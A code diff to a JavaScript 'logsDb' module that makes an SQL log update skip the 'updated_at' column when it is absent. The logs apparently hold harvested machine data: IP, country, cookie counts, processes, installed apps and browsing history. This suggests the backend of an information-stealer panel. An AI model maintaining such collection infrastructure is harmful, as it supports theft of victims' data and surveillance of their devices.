@@ -280,19 +280,34 @@ const logsDb = {
                 cookies: cookieCount
             };
             
-            // Update the log
-            db.prepare(`
+            // Update the log - check if updated_at column exists first
+            let updateQuery = `
                 UPDATE logs 
-                SET ip = ?, country = ?, date = ?, data_summary = ?, pc_data = ?, updated_at = CURRENT_TIMESTAMP
-                WHERE session_id = ?
-            `).run(
+                SET ip = ?, country = ?, date = ?, data_summary = ?, pc_data = ?
+            `;
+            const updateParams = [
                 ip || existingLog.ip,
                 country || existingLog.country,
                 date || existingLog.date,
                 JSON.stringify(mergedDataSummary),
-                JSON.stringify(mergedPcData),
-                sessionId
-            );
+                JSON.stringify(mergedPcData)
+            ];
+            
+            // Check if updated_at column exists
+            try {
+                const columns = db.prepare("PRAGMA table_info(logs)").all();
+                const hasUpdatedAt = columns.some(col => col.name === 'updated_at');
+                if (hasUpdatedAt) {
+                    updateQuery += `, updated_at = CURRENT_TIMESTAMP`;
+                }
+            } catch (e) {
+                // If we can't check, just proceed without updated_at
+            }
+            
+            updateQuery += ` WHERE session_id = ?`;
+            updateParams.push(sessionId);
+            
+            db.prepare(updateQuery).run(...updateParams);
             
             console.log(`Updated log ${existingLog.id}: ${mergedDataSummary.processes} processes, ${mergedDataSummary.installedApps} apps, ${mergedDataSummary.historyEntries} history entries`);
             
